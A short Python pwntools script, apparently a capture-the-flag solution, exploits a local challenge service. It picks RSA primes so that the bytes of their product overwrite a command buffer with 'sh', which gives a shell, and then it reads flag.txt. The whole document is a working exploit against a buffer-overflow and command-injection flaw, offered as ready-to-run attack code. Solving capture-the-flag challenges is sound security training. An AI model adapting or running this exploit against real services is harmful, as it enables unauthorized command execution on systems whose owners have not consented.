import itertools
from pwn import *

io = remote('localhost', 50000)

# 0x110 bytes until command from n
offset = 0x110

payload = b'sh\0'
payload_num = int.from_bytes(payload, 'big')
payload_bitsz = len(payload)*8

p = 2**1100 + 1
# ensures the lowest bits of n are the payload
q = (pow(p, -1, 2**payload_bitsz) * payload_num) % (2**payload_bitsz)

# now we make q large enough such that the payload is at offset 0x110
for i in itertools.count(payload_bitsz):
    n = p*q
    res = n.to_bytes(0x200, 'big').lstrip(b'\0')
    if res[offset:offset+len(payload)] == payload:
        break
    q |= 1<<i

io.sendlineafter(b'> ', b'1') # Set RSA Params
io.sendlineafter(b'e: ', b'1')
io.sendlineafter(b'p: ', str(p).encode())
io.sendlineafter(b'q: ', str(q).encode())
io.sendlineafter(b'> ', b'3') # Check version
io.sendline(b'cat flag.txt')
print(io.recv().decode())